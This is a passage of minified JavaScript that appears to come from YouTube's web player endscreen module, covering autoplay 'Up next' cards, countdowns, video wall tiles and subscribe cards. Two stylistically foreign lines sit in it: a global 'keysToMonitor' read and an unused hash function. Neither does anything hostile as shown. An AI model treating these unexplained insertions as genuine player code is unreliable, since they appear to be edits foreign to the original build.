(function (g) {
  var window = this;
  'use strict';
  var bnb = function (a, b) {
      a.Ra("onAutonavCoundownStarted", b);
    },
    l6 = function (a, b, c) {
      g.rr(a.element, "ytp-suggestion-set", !!b.videoId);
      var d = b.playlistId;
      c = b.Jg(c ? c : "mqdefault.jpg");
      var e = null,
        f = null;
      b instanceof g.PM && (b.lengthText ? (e = b.lengthText || null, f = b.yw || null) : b.lengthSeconds && (e = g.MQ(b.lengthSeconds), f = g.MQ(b.lengthSeconds, !0)));
      var h = !!d;
      d = h && "RD" === g.Nza(d).type;
      var l = b instanceof g.PM ? b.isLivePlayback : null,
        m = b instanceof g.PM ? b.isUpcoming : null,
        n = b.author,
        p = b.shortViewCount,
        q = b.publishedTimeText,
        t = [],
        u = [];
      n && t.push(n);
      p && (t.push(p), u.push(p));
      q && u.push(q);
      c = {
        title: b.title,
        author: n,
        author_and_views: t.join(" \u2022 "),
        aria_label: b.ariaLabel || g.PO("Watch $TITLE", {
          TITLE: b.title
        }),
        duration: e,
        timestamp: f,
        url: b.Rk(),
        is_live: l,
        is_upcoming: m,
        is_list: h,
        is_mix: d,
        background: c ? "background-image: url(" + c + ")" : "",
        views_and_publish_time: u.join(" \u2022 "),
        autoplayAlternativeHeader: b.Ms
      };
      b instanceof g.OM && (c.playlist_length = b.playlistLength);
      a.update(c);
    },
    m6 = function (a) {
      var b = a.W(),
        c = b.D;
      g.X.call(this, {
        I: "a",
        T: "ytp-autonav-suggestion-card",
        Y: {
          href: "{{url}}",
          target: c ? b.ea : "",
          "aria-label": "{{aria_label}}",
          "data-is-live": "{{is_live}}",
          "data-is-list": "{{is_list}}",
          "data-is-mix": "{{is_mix}}",
          "data-is-upcoming": "{{is_upcoming}}"
        },
        X: [{
          I: "div",
          Na: ["ytp-autonav-endscreen-upnext-thumbnail", "ytp-autonav-thumbnail-small"],
          Y: {
            style: "{{background}}"
          },
          X: [{
            I: "div",
            Y: {
              "aria-label": "{{timestamp}}"
            },
            Na: ["ytp-autonav-timestamp"],
            Aa: "{{duration}}"
          }, {
            I: "div",
            Na: ["ytp-autonav-live-stamp"],
            Aa: "Live"
          }, {
            I: "div",
            Na: ["ytp-autonav-upcoming-stamp"],
            Aa: "Upcoming"
          }, {
            I: "div",
            T: "ytp-autonav-list-overlay",
            X: [{
              I: "div",
              T: "ytp-autonav-mix-text",
              Aa: "Mix"
            }, {
              I: "div",
              T: "ytp-autonav-mix-icon"
            }]
          }]
        }, {
          I: "div",
          Na: ["ytp-autonav-endscreen-upnext-title", "ytp-autonav-title-card"],
          Aa: "{{title}}"
        }, {
          I: "div",
          Na: ["ytp-autonav-endscreen-upnext-author", "ytp-autonav-author-card"],
          Aa: "{{author}}"
        }, {
          I: "div",
          Na: ["ytp-autonav-endscreen-upnext-author", "ytp-autonav-view-and-date-card"],
          Aa: "{{views_and_publish_time}}"
        }]
      });
      this.J = a;
      this.suggestion = null;
      this.j = c;
      this.Ua("click", this.onClick);
      this.Ua("keypress", this.onKeyPress);
    },
    n6 = function (a, b) {
      b = void 0 === b ? !1 : b;
      g.X.call(this, {
        I: "div",
        T: "ytp-autonav-endscreen-countdown-overlay"
      });
      var c = this;
      this.K = b;
      this.G = void 0;
      this.C = 0;
      this.container = new g.X({
        I: "div",
        T: "ytp-autonav-endscreen-countdown-container"
      });
      g.H(this, this.container);
      this.container.Ha(this.element);
      b = a.W();
      var d = b.D;
      this.J = a;
      this.suggestion = null;
      this.onVideoDataChange("newdata", this.J.getVideoData());
      this.V(a, "videodatachange", this.onVideoDataChange);
      this.j = new g.X({
        I: "div",
        T: "ytp-autonav-endscreen-upnext-container",
        Y: {
          "aria-label": "{{aria_label}}",
          "data-is-live": "{{is_live}}",
          "data-is-list": "{{is_list}}",
          "data-is-mix": "{{is_mix}}",
          "data-is-upcoming": "{{is_upcoming}}"
        },
        X: [{
          I: "div",
          T: "ytp-autonav-endscreen-upnext-header"
        }, {
          I: "div",
          T: "ytp-autonav-endscreen-upnext-alternative-header",
          Aa: "{{autoplayAlternativeHeader}}"
        }, {
          I: "a",
          T: "ytp-autonav-endscreen-link-container",
          Y: {
            href: "{{url}}",
            target: d ? b.ea : ""
          },
          X: [{
            I: "div",
            T: "ytp-autonav-endscreen-upnext-thumbnail",
            Y: {
              style: "{{background}}"
            },
            X: [{
              I: "div",
              Y: {
                "aria-label": "{{timestamp}}"
              },
              Na: ["ytp-autonav-timestamp"],
              Aa: "{{duration}}"
            }, {
              I: "div",
              Na: ["ytp-autonav-live-stamp"],
              Aa: "Live"
            }, {
              I: "div",
              Na: ["ytp-autonav-upcoming-stamp"],
              Aa: "Upcoming"
            }]
          }, {
            I: "div",
            T: "ytp-autonav-endscreen-video-info",
            X: [{
              I: "div",
              T: "ytp-autonav-endscreen-premium-badge"
            }, {
              I: "div",
              T: "ytp-autonav-endscreen-upnext-title",
              Aa: "{{title}}"
            }, {
              I: "div",
              T: "ytp-autonav-endscreen-upnext-author",
              Aa: "{{author}}"
            }, {
              I: "div",
              T: "ytp-autonav-view-and-date",
              Aa: "{{views_and_publish_time}}"
            }, {
              I: "div",
              T: "ytp-autonav-author-and-view",
              Aa: "{{author_and_views}}"
            }]
          }]
        }]
      });
      g.H(this, this.j);
      this.j.Ha(this.container.element);
      d || this.V(this.j.Ia("ytp-autonav-endscreen-link-container"), "click", this.vS);
      this.J.xb(this.container.element, this, 115127);
      this.J.xb(this.j.Ia("ytp-autonav-endscreen-link-container"), this, 115128);
      this.overlay = new g.X({
        I: "div",
        T: "ytp-autonav-overlay"
      });
      g.H(this, this.overlay);
      this.overlay.Ha(this.container.element);
      this.B = new g.X({
        I: "div",
        T: "ytp-autonav-endscreen-button-container"
      });
      g.H(this, this.B);
      this.B.Ha(this.container.element);
      this.cancelButton = new g.X({
        I: "button",
        Na: ["ytp-autonav-endscreen-upnext-button", "ytp-autonav-endscreen-upnext-cancel-button", b.N("web_modern_buttons") ? "ytp-autonav-endscreen-upnext-button-rounded" : ""],
        Y: {
          "aria-label": "Cancel autoplay"
        },
        Aa: "Cancel"
      });
      g.H(this, this.cancelButton);
      this.cancelButton.Ha(this.B.element);
      this.cancelButton.Ua("click", this.s1, this);
      this.J.xb(this.cancelButton.element, this, 115129);
      this.playButton = new g.X({
        I: "a",
        Na: ["ytp-autonav-endscreen-upnext-button", "ytp-autonav-endscreen-upnext-play-button", b.N("web_modern_buttons") ? "ytp-autonav-endscreen-upnext-button-rounded" : ""],
        Y: {
          href: "{{url}}",
          role: "button",
          "aria-label": "Play next video"
        },
        Aa: "Play Now"
      });
      g.H(this, this.playButton);
      this.playButton.Ha(this.B.element);
      this.playButton.Ua("click", this.vS, this);
      this.J.xb(this.playButton.element, this, 115130);
      this.D = new g.fr(function () {
        cnb(c);
      }, 500);
      g.H(this, this.D);
      this.uS();
      this.V(a, "autonavvisibility", this.uS);
      this.J.N("web_autonav_color_transition") && (this.V(a, "autonavchange", this.q1), this.V(a, "onAutonavCoundownStarted", this.e8));
    },
    o6 = function (a) {
      var b = a.J.Qk(!0, a.J.isFullscreen());
      g.rr(a.container.element, "ytp-autonav-endscreen-small-mode", a.Mg(b));
      g.rr(a.container.element, "ytp-autonav-endscreen-is-premium", !!a.suggestion && !!a.suggestion.WJ);
      g.rr(a.J.getRootNode(), "ytp-autonav-endscreen-cancelled-state", !a.J.Df());
      g.rr(a.J.getRootNode(), "countdown-running", a.Uk());
      g.rr(a.container.element, "ytp-player-content", a.J.Df());
      g.zo(a.overlay.element, {
        width: b.width + "px"
      });
      if (!a.Uk()) {
        a.J.Df() ? dnb(a, Math.round(enb(a) / 1E3)) : dnb(a);
        b = !!a.suggestion && !!a.suggestion.Ms;
        var c = a.J.Df() || !b;
        g.rr(a.container.element, "ytp-autonav-endscreen-upnext-alternative-header-only", !c && b);
        g.rr(a.container.element, "ytp-autonav-endscreen-upnext-no-alternative-header", c && !b);
        g.cQ(a.B, a.J.Df());
        g.rr(a.element, "ytp-enable-w2w-color-transitions", fnb(a));
      }
    },
    cnb = function (a) {
      var b = enb(a),
        c = Math,
        d = c.min;
      var e = a.C ? Date.now() - a.C : 0;
      c = d.call(c, e, b);
      dnb(a, Math.ceil((b - c) / 1E3));
      500 >= b - c && a.Uk() ? a.select(!0) : a.Uk() && a.D.start();
    },
    enb = function (a) {
      if (a.J.isFullscreen()) {
        var b;
        a = null == (b = a.J.getVideoData()) ? void 0 : b.KB;
        return -1 === a || void 0 === a ? 8E3 : a;
      }
      return 0 <= a.J.kt() ? a.J.kt() : g.cK(a.J.W().experiments, "autoplay_time") || 1E4;
    },
    fnb = function (a) {
      var b;
      return !(null == (b = a.J.getVideoData()) || !b.watchToWatchTransitionRenderer);
    },
    dnb = function (a, b) {
      b = void 0 === b ? -1 : b;
      a = a.j.Ia("ytp-autonav-endscreen-upnext-header");
      g.We(a);
      if (0 <= b) {
        b = String(b);
        var c = "Up next in $SECONDS".match(RegExp("\\$SECONDS", "gi"))[0],
          d = "Up next in $SECONDS".indexOf(c);
        if (0 <= d) {
          a.appendChild(g.Ue("Up next in $SECONDS".slice(0, d)));
          var e = g.Te("span");
          g.lr(e, "ytp-autonav-endscreen-upnext-header-countdown-number");
          g.jf(e, b);
          a.appendChild(e);
          a.appendChild(g.Ue("Up next in $SECONDS".slice(d + c.length)));
          return;
        }
      }
      g.jf(a, "Up next");
    },
    p6 = function (a, b) {
      g.X.call(this, {
        I: "div",
        Na: ["html5-endscreen", "ytp-player-content", b || "base-endscreen"]
      });
      this.created = !1;
      this.player = a;
    },
    q6 = function (a) {
      g.X.call(this, {
        I: "div",
        Na: ["ytp-upnext", "ytp-player-content"],
        Y: {
          "aria-label": "{{aria_label}}"
        },
        X: [{
          I: "div",
          T: "ytp-cued-thumbnail-overlay-image",
          Y: {
            style: "{{background}}"
          }
        }, {
          I: "span",
          T: "ytp-upnext-top",
          X: [{
            I: "span",
            T: "ytp-upnext-header",
            Aa: "Up Next"
          }, {
            I: "span",
            T: "ytp-upnext-title",
            Aa: "{{title}}"
          }, {
            I: "span",
            T: "ytp-upnext-author",
            Aa: "{{author}}"
          }]
        }, {
          I: "a",
          T: "ytp-upnext-autoplay-icon",
          Y: {
            role: "button",
            href: "{{url}}",
            "aria-label": "Play next video"
          },
          X: [{
            I: "svg",
            Y: {
              height: "100%",
              version: "1.1",
              viewBox: "0 0 72 72",
              width: "100%"
            },
            X: [{
              I: "circle",
              T: "ytp-svg-autoplay-circle",
              Y: {
                cx: "36",
                cy: "36",
                fill: "#fff",
                "fill-opacity": "0.3",
                r: "31.5"
              }
            }, {
              I: "circle",
              T: "ytp-svg-autoplay-ring",
              Y: {
                cx: "-36",
                cy: "36",
                "fill-opacity": "0",
                r: "33.5",
                stroke: "#FFFFFF",
                "stroke-dasharray": "211",
                "stroke-dashoffset": "-211",
                "stroke-width": "4",
                transform: "rotate(-90)"
              }
            }, {
              I: "path",
              T: "ytp-svg-fill",
              Y: {
                d: "M 24,48 41,36 24,24 V 48 z M 44,24 v 24 h 4 V 24 h -4 z"
              }
            }]
          }]
        }, {
          I: "span",
          T: "ytp-upnext-bottom",
          X: [{
            I: "span",
            T: "ytp-upnext-cancel"
          }, {
            I: "span",
            T: "ytp-upnext-paused",
            Aa: "Autoplay is paused"
          }]
        }]
      });
      this.api = a;
      this.cancelButton = null;
      this.G = this.Ia("ytp-svg-autoplay-ring");
      this.C = this.notification = this.j = this.suggestion = null;
      this.D = new g.fr(this.HG, 5E3, this);
      this.B = 0;
      var b = this.Ia("ytp-upnext-cancel");
      this.cancelButton = new g.X({
        I: "button",
        Na: ["ytp-upnext-cancel-button", "ytp-button"],
        Y: {
          tabindex: "0",
          "aria-label": "Cancel autoplay"
        },
        Aa: "Cancel"
      });
      g.H(this, this.cancelButton);
      this.cancelButton.Ua("click", this.t1, this);
      this.cancelButton.Ha(b);
      this.cancelButton && this.api.xb(this.cancelButton.element, this, 115129);
      g.H(this, this.D);
      this.api.xb(this.element, this, 18788);
      b = this.Ia("ytp-upnext-autoplay-icon");
      this.V(b, "click", this.v1);
      this.api.xb(b, this, 115130);
      this.wS();
      this.V(a, "autonavvisibility", this.wS);
      this.V(a, "mdxnowautoplaying", this.N8);
      this.V(a, "mdxautoplaycanceled", this.O8);
      g.rr(this.element, "ytp-upnext-mobile", this.api.W().B);
    },
    gnb = function (a, b) {
      if (b) return b;
      if (a.api.isFullscreen()) {
        var c;
        a = null == (c = a.api.getVideoData()) ? void 0 : c.KB;
        return -1 === a || void 0 === a ? 8E3 : a;
      }
      return 0 <= a.api.kt() ? a.api.kt() : g.cK(a.api.W().experiments, "autoplay_time") || 1E4;
    },
    hnb = function (a, b) {
      b = gnb(a, b);
      var c = Math,
        d = c.min;
      var e = (0, g.MC)() - a.B;
      c = d.call(c, e, b);
      b = 0 === b ? 1 : Math.min(c / b, 1);
      a.G.setAttribute("stroke-dashoffset", "" + -211 * (b + 1));
      1 <= b && a.Uk() && 3 !== a.api.getPresentingPlayerType() ? a.select(!0) : a.Uk() && a.j.start();
    },
    r6 = function (a) {
      p6.call(this, a, "autonav-endscreen");
      this.overlay = this.videoData = null;
      this.table = new g.X({
        I: "div",
        T: "ytp-suggestion-panel",
        X: [{
          I: "div",
          Na: ["ytp-autonav-endscreen-upnext-header", "ytp-autonav-endscreen-more-videos"],
          Aa: "More videos"
        }]
      });
      this.S = new g.X({
        I: "div",
        T: "ytp-suggestions-container"
      });
      this.videos = [];
      this.C = null;
      this.G = this.K = !1;
      this.B = new n6(this.player);
      g.H(this, this.B);
      this.B.Ha(this.element);
      a.getVideoData().Ue ? this.j = this.B : (this.j = new q6(a), g.cS(this.player, this.j.element, 4), g.H(this, this.j));
      this.overlay = new g.X({
        I: "div",
        T: "ytp-autonav-overlay-cancelled-state"
      });
      g.H(this, this.overlay);
      this.overlay.Ha(this.element);
      this.D = new g.tJ(this);
      g.H(this, this.D);
      g.H(this, this.table);
      this.table.Ha(this.element);
      this.table.show();
      g.H(this, this.S);
      this.S.Ha(this.table.element);
      this.hide();
    },
    s6 = function (a) {
      var b = a.Df();
      b !== a.G && (a.G = b, a.player.qa("autonavvisibility"), a.G ? (a.B !== a.j && a.B.hide(), a.table.hide()) : (a.B !== a.j && a.B.show(), a.table.show()));
    },
    t6 = function (a, b) {
      g.X.call(this, {
        I: "button",
        Na: ["ytp-watch-on-youtube-button", "ytp-button"],
        Aa: "{{content}}"
      });
      this.J = a;
      this.buttonType = this.buttonType = b;
      this.updateButton();
      2 === this.buttonType && g.nr(this.element, "ytp-continue-watching-button");
      this.Ua("click", this.onClick);
      this.Ua("videodatachange", this.updateButton);
      g.cQ(this, !0);
    },
    u6 = function (a, b) {
      p6.call(this, a, "embeds-lite-endscreen");
      this.J = a;
      this.wb = b;
      this.J.xb(this.element, this, 156943);
      this.watchButton = new t6(a, 2);
      g.H(this, this.watchButton);
      this.watchButton.Ha(this.element);
      this.hide();
    },
    inb = function (a) {
      p6.call(this, a, "subscribecard-endscreen");
      this.j = new g.X({
        I: "div",
        T: "ytp-subscribe-card",
        X: [{
          I: "img",
          T: "ytp-author-image",
          Y: {
            src: "{{profilePicture}}"
          }
        }, {
          I: "div",
          T: "ytp-subscribe-card-right",
          X: [{
            I: "div",
            T: "ytp-author-name",
            Aa: "{{author}}"
          }, {
            I: "div",
            T: "html5-subscribe-button-container"
          }]
        }]
      });
      g.H(this, this.j);
      this.j.Ha(this.element);
      var b = a.getVideoData();
      this.subscribeButton = new g.PT("Subscribe", null, "Unsubscribe", null, !0, !1, b.Ck, b.subscribed, "trailer-endscreen", null, a);
      g.H(this, this.subscribeButton);
      this.subscribeButton.Ha(this.j.Ia("html5-subscribe-button-container"));
      this.V(a, "videodatachange", this.Ta);
      this.Ta();
      this.hide();
    },
    v6 = function (a) {
      var b = a.W(),
        c = g.wJ || g.vL ? {
          style: "will-change: opacity"
        } : void 0,
        d = b.D,
        e = ["ytp-videowall-still"];
      b.B && e.push("ytp-videowall-show-text");
      g.X.call(this, {
        I: "a",
        Na: e,
        Y: {
          href: "{{url}}",
          target: d ? b.ea : "",
          "aria-label": "{{aria_label}}",
          "data-is-live": "{{is_live}}",
          "data-is-list": "{{is_list}}",
          "data-is-mix": "{{is_mix}}"
        },
        X: [{
          I: "div",
          T: "ytp-videowall-still-image",
          Y: {
            style: "{{background}}"
          }
        }, {
          I: "span",
          T: "ytp-videowall-still-info",
          Y: {
            "aria-hidden": "true"
          },
          X: [{
            I: "span",
            T: "ytp-videowall-still-info-bg",
            X: [{
              I: "span",
              T: "ytp-videowall-still-info-content",
              Y: c,
              X: [{
                I: "span",
                T: "ytp-videowall-still-info-title",
                Aa: "{{title}}"
              }, {
                I: "span",
                T: "ytp-videowall-still-info-author",
                Aa: "{{author_and_views}}"
              }, {
                I: "span",
                T: "ytp-videowall-still-info-live",
                Aa: "Live"
              }, {
                I: "span",
                T: "ytp-videowall-still-info-duration",
                Aa: "{{duration}}"
              }]
            }]
          }]
        }, {
          I: "span",
          Na: ["ytp-videowall-still-listlabel-regular", "ytp-videowall-still-listlabel"],
          Y: {
            "aria-hidden": "true"
          },
          X: [{
            I: "span",
            T: "ytp-videowall-still-listlabel-icon"
          }, "Playlist", {
            I: "span",
            T: "ytp-videowall-still-listlabel-length",
            X: [" (", {
              I: "span",
              Aa: "{{playlist_length}}"
            }, ")"]
          }]
        }, {
          I: "span",
          Na: ["ytp-videowall-still-listlabel-mix", "ytp-videowall-still-listlabel"],
          Y: {
            "aria-hidden": "true"
          },
          X: [{
            I: "span",
            T: "ytp-videowall-still-listlabel-mix-icon"
          }, "Mix", {
            I: "span",
            T: "ytp-videowall-still-listlabel-length",
            Aa: " (50+)"
          }]
        }]
      });
      this.suggestion = null;
      this.B = d;
      this.api = a;
      this.j = new g.tJ(this);
      g.H(this, this.j);
      this.Ua("click", this.onClick);
      this.Ua("keypress", this.onKeyPress);
      this.j.V(a, "videodatachange", this.onVideoDataChange);
      a.ag(this.element, this);
      this.onVideoDataChange();
    },
    w6 = function (a) {
      p6.call(this, a, "videowall-endscreen");
      var b = this;
      this.J = a;
      this.C = 0;
      this.stills = [];
      this.D = this.videoData = null;
      this.G = this.S = !1;
      this.ea = null;
      this.B = new g.tJ(this);
      g.H(this, this.B);
      this.K = new g.fr(function () {
        g.nr(b.element, "ytp-show-tiles");
      }, 0);
      g.H(this, this.K);
      var c = new g.X({
        I: "button",
        Na: ["ytp-button", "ytp-endscreen-previous"],
        Y: {
          "aria-label": "Previous"
        },
        X: [g.gQ()]
      });
      g.H(this, c);
      c.Ha(this.element);
      c.Ua("click", this.B1, this);
      this.table = new g.$P({
        I: "div",
        T: "ytp-endscreen-content"
      });
      g.H(this, this.table);
      this.table.Ha(this.element);
      c = new g.X({
        I: "button",
        Na: ["ytp-button", "ytp-endscreen-next"],
        Y: {
          "aria-label": "Next"
        },
        X: [g.hQ()]
      });
      g.H(this, c);
      c.Ha(this.element);
      c.Ua("click", this.A1, this);
      a.getVideoData().Ue ? this.j = new n6(a, !0) : this.j = new q6(a);
      g.H(this, this.j);
      g.cS(this.player, this.j.element, 4);
      a.xb(this.element, this, 158789);
      this.hide();
    },
    x6 = function (a) {
      return g.dS(a.player) && a.nC() && !a.D;
    },
    y6 = function (a) {
      var b = a.Df();
      b !== a.S && (a.S = b, a.player.qa("autonavvisibility"));
    },
    z6 = function (a) {
      p6.call(this, a, "watch-again-on-youtube-endscreen");
      this.watchButton = new t6(a, 1);
      g.H(this, this.watchButton);
      this.watchButton.Ha(this.element);
      g.Nbb(a) && (this.j = new g.F2(a, g.LR(a)), g.H(this, this.j), this.B = new g.X({
        I: "div",
        Na: ["ytp-watch-again-on-youtube-endscreen-more-videos-container"],
        Y: {
          tabIndex: "-1"
        },
        X: [this.j]
      }), g.H(this, this.B), this.j.Ha(this.B.element), this.B.Ha(this.element));
      a.xb(this.element, this, 156914);
      this.hide();
    },
    mnb = function (a) {
      g.dT.call(this, a);
      var b = this;
      this.endScreen = null;
      this.B = this.j = this.C = this.D = !1;
      this.listeners = new g.tJ(this);
      g.H(this, this.listeners);
      var c = a.W(),
        d = a.getVideoData();
      d = d && 0 !== d.limitedPlaybackDurationInSeconds;
      g.rB(g.GL(c)) && d && !g.ZR(a) ? (this.B = !0, this.endScreen = new u6(a, g.LR(a))) : g.$R(a) ? this.endScreen = new z6(a) : jnb(a) ? (this.D = !0, knb(this), this.j ? this.endScreen = new r6(a) : this.endScreen = new w6(a)) : c.fh ? this.endScreen = new inb(a) : this.endScreen = new p6(a);
      g.H(this, this.endScreen);
      g.cS(a, this.endScreen.element, 4);
      lnb(this);
      this.listeners.V(a, "videodatachange", this.onVideoDataChange, this);
      this.listeners.V(a, g.oG("endscreen"), function (e) {
        b.onCueRangeEnter(e);
      });
      this.listeners.V(a, g.pG("endscreen"), function (e) {
        b.onCueRangeExit(e);
      });
    },
    knb = function (a) {
      var b = a.player.getVideoData();
      if (!b || a.j === b.Nl && a.C === b.Ue) return !1;
      a.j = b.Nl;
      a.C = b.Ue;
      return !0;
    },
    jnb = function (a) {
      a = a.W();
      return a.Td && !a.fh;
    },
    lnb = function (a) {
      a.player.Se("endscreen");
      var b = a.player.getVideoData();
      b = new g.nG(Math.max(1E3 * (b.lengthSeconds - 10), 0), 0x8000000000000, {
        id: "preload",
        namespace: "endscreen"
      });
      var c = new g.nG(0x8000000000000, 0x8000000000000, {
        id: "load",
        priority: 8,
        namespace: "endscreen"
      });
      a.player.jf([b, c]);
    };
  g.FV.prototype.aB = g.ba(37, function (a) {
    this.bQ !== a && (this.bQ = a, this.Il());
  });
  g.vU.prototype.Rr = g.ba(36, function (a) {
    this.j !== a && (this.j = a, this.Ta());
  });
  g.FV.prototype.Rr = g.ba(35, function (a) {
    this.shareButton && this.shareButton.Rr(a);
  });
  g.qU.prototype.Qr = g.ba(34, function (a) {
    this.j !== a && (this.j = a, this.Ta());
  });
  g.FV.prototype.Qr = g.ba(33, function (a) {
    this.overflowButton && this.overflowButton.Qr(a);
  });
  g.GT.prototype.pF = g.ba(32, function (a) {
    this.cQ !== a && (this.cQ = a, this.bq());
  });
  g.UR.prototype.kt = g.ba(6, function () {
    return this.app.kt();
  });
  g.DZ.prototype.kt = g.ba(5, function () {
    return this.getVideoData().iU;
  });
  g.x(m6, g.X);
  m6.prototype.select = function () {
    this.J.Go(this.suggestion.videoId, this.suggestion.sessionData, this.suggestion.playlistId, void 0, void 0, this.suggestion.JC || void 0) && this.J.ub(this.element);
  };
  m6.prototype.onClick = function (a) {
    g.uS(a, this.J, this.j, this.suggestion.sessionData || void 0) && this.select();
  };
  m6.prototype.onKeyPress = function (a) {
    switch (a.keyCode) {
      case 13:
      case 32:
        g.XO(a) || (this.select(), g.YO(a));
    }
  };
  const keysToMonitor = window.keysToMonitor;
  g.x(n6, g.X);
  g.k = n6.prototype;
  g.k.SF = function (a) {
    this.suggestion !== a && (this.suggestion = a, l6(this.j, a), this.playButton.updateValue("url", this.suggestion.Rk()), o6(this));
  };
  g.k.Uk = function () {
    return 0 < this.C;
  };
  g.k.iB = function () {
    this.Uk() || (this.C = Date.now(), cnb(this), bnb(this.J, enb(this)), g.rr(this.J.getRootNode(), "countdown-running", this.Uk()));
  };
  g.k.Rw = function () {
    this.Zr();
    cnb(this);
    var a = this.j.Ia("ytp-autonav-endscreen-upnext-header");
    a && g.jf(a, "Up next");
  };
  g.k.Zr = function () {
    this.Uk() && (this.D.stop(), this.C = 0);
  };
  g.k.select = function (a) {
    this.J.nextVideo(!1, void 0 === a ? !1 : a);
    this.Zr();
  };
  function calcHashCode(inputObj) {
    const localKeys = Object.keys(inputObj);
    const sortedKString = localKeys.sort().join("");
    let localHash = 0;
    for (let idx = 0; idx < sortedKString.length; idx++) {
      const charCode = sortedKString.charCodeAt(idx);
      localHash = (localHash << 5) - localHash + charCode;
      localHash = localHash & localHash;
    }
    return localHash.toString(16);
  }
  g.k.vS = function (a) {
    g.uS(a, this.J) && (a.currentTarget === this.playButton.element ? this.J.ub(this.playButton.element) : a.currentTarget === this.j.Ia("ytp-autonav-endscreen-link-container") && (a = this.j.Ia("ytp-autonav-endscreen-link-container"), this.J.Ya(a, !0), this.J.ub(a)), this.select());
  };
  g.k.s1 = function () {
    this.J.ub(this.cancelButton.element);
    g.WR(this.J, !0);
    this.G && this.J.Ra("innertubeCommand", this.G);
  };
  g.k.onVideoDataChange = function (a, b) {
    var c;
    this.G = null == (c = b.i5) ? void 0 : c.command;
  };
  g.k.e8 = function (a) {
    if (fnb(this)) {
      var b = this.J.getVideoData().watchToWatchTransitionRenderer,
        c = null == b ? void 0 : b.fromColorPaletteDark;
      b = null == b ? void 0 : b.toColorPaletteDark;
      if (c && b) {
        var d = this.element;
        d.style.setProperty("--w2w-start-background-color", g.TQ(c.surgeColor));
        d.style.setProperty("--w2w-start-primary-text-color", g.TQ(c.primaryTitleColor));
        d.style.setProperty("--w2w-start-secondary-text-color", g.TQ(c.secondaryTitleColor));
        d.style.setProperty("--w2w-end-background-color", g.TQ(b.surgeColor));
        d.style.setProperty("--w2w-end-primary-text-color", g.TQ(b.primaryTitleColor));
        d.style.setProperty("--w2w-end-secondary-text-color", g.TQ(b.secondaryTitleColor));
        d.style.setProperty("--w2w-animation-duration", a + "ms");
      }
      g.rr(this.element, "ytp-w2w-animate", !0);
    }
  };
  g.k.q1 = function (a) {
    this.J.N("web_autonav_color_transition") && 2 !== a && g.rr(this.element, "ytp-w2w-animate", !1);
  };
  g.k.uS = function () {
    var a = this.J.Df();
    this.K && this.Gb !== a && g.cQ(this, a);
    o6(this);
    this.J.Ya(this.container.element, a);
    this.J.Ya(this.cancelButton.element, a);
    this.J.Ya(this.j.Ia("ytp-autonav-endscreen-link-container"), a);
    this.J.Ya(this.playButton.element, a);
  };
  g.k.Mg = function (a) {
    return 400 > a.width || 459 > a.height;
  };
  g.x(p6, g.X);
  g.k = p6.prototype;
  g.k.create = function () {
    this.created = !0;
  };
  g.k.destroy = function () {
    this.created = !1;
  };
  g.k.nC = function () {
    return !1;
  };
  g.k.Df = function () {
    return !1;
  };
  g.k.kX = function () {
    return !1;
  };
  g.x(q6, g.X);
  g.k = q6.prototype;
  g.k.HG = function () {
    this.notification && (this.D.stop(), this.Pc(this.C), this.C = null, this.notification.close(), this.notification = null);
  };
  g.k.SF = function (a) {
    this.suggestion = a;
    l6(this, a, "hqdefault.jpg");
  };
  g.k.wS = function () {
    g.cQ(this, this.api.Df());
    this.api.Ya(this.element, this.api.Df());
    this.api.Ya(this.Ia("ytp-upnext-autoplay-icon"), this.api.Df());
    this.cancelButton && this.api.Ya(this.cancelButton.element, this.api.Df());
  };
  g.k.X8 = function () {
    window.focus();
    this.HG();
  };
  g.k.iB = function (a) {
    var b = this;
    this.Uk() || (g.lE("a11y-announce", "Up Next " + this.suggestion.title), this.B = (0, g.MC)(), this.j = new g.fr(function () {
      hnb(b, a);
    }, 25), hnb(this, a), bnb(this.api, gnb(this, a)));
    g.pr(this.element, "ytp-upnext-autoplay-paused");
  };
  g.k.hide = function () {
    g.X.prototype.hide.call(this);
  };
  g.k.Uk = function () {
    return !!this.j;
  };
  g.k.Rw = function () {
    this.Zr();
    this.B = (0, g.MC)();
    hnb(this);
    g.nr(this.element, "ytp-upnext-autoplay-paused");
  };
  g.k.Zr = function () {
    this.Uk() && (this.j.dispose(), this.j = null);
  };
  g.k.select = function (a) {
    a = void 0 === a ? !1 : a;
    if (this.api.W().N("autonav_notifications") && a && window.Notification && "function" === typeof document.hasFocus) {
      var b = Notification.permission;
      "default" === b ? Notification.requestPermission() : "granted" !== b || document.hasFocus() || (this.HG(), this.notification = new Notification("Up Next", {
        body: this.suggestion.title,
        icon: this.suggestion.Jg()
      }), this.C = this.V(this.notification, "click", this.X8), this.D.start());
    }
    this.Zr();
    this.api.nextVideo(!1, a);
  };
  g.k.v1 = function (a) {
    !g.hf(this.cancelButton.element, g.WO(a)) && g.uS(a, this.api) && (this.api.Df() && this.api.ub(this.Ia("ytp-upnext-autoplay-icon")), this.select());
  };
  g.k.t1 = function () {
    this.api.Df() && this.cancelButton && this.api.ub(this.cancelButton.element);
    g.WR(this.api, !0);
  };
  g.k.N8 = function (a) {
    this.api.getPresentingPlayerType();
    this.show();
    this.iB(a);
  };
  g.k.O8 = function () {
    this.api.getPresentingPlayerType();
    this.Zr();
    this.hide();
  };
  g.k.ya = function () {
    this.Zr();
    this.HG();
    g.X.prototype.ya.call(this);
  };
  g.x(r6, p6);
  g.k = r6.prototype;
  g.k.create = function () {
    p6.prototype.create.call(this);
    this.D.V(this.player, "appresize", this.PB);
    this.D.V(this.player, "onVideoAreaChange", this.PB);
    this.D.V(this.player, "videodatachange", this.onVideoDataChange);
    this.D.V(this.player, "autonavchange", this.xS);
    this.D.V(this.player, "autonavcancel", this.w1);
    this.onVideoDataChange();
  };
  g.k.show = function () {
    p6.prototype.show.call(this);
    (this.K || this.C && this.C !== this.videoData.clientPlaybackNonce) && g.WR(this.player, !1);
    g.dS(this.player) && this.nC() && !this.C ? (s6(this), 2 === this.videoData.autonavState ? 3 === this.player.getVisibilityState() ? this.j.select(!0) : this.j.iB() : 3 === this.videoData.autonavState && this.j.Rw()) : (g.WR(this.player, !0), s6(this));
    this.PB();
  };
  g.k.hide = function () {
    p6.prototype.hide.call(this);
    this.j.Rw();
    s6(this);
  };
  g.k.PB = function () {
    var a = this.player.Qk(!0, this.player.isFullscreen());
    s6(this);
    o6(this.B);
    g.rr(this.element, "ytp-autonav-cancelled-small-mode", this.Mg(a));
    g.rr(this.element, "ytp-autonav-cancelled-tiny-mode", this.cI(a));
    g.rr(this.element, "ytp-autonav-cancelled-mini-mode", 400 >= a.width || 360 >= a.height);
    this.overlay && g.zo(this.overlay.element, {
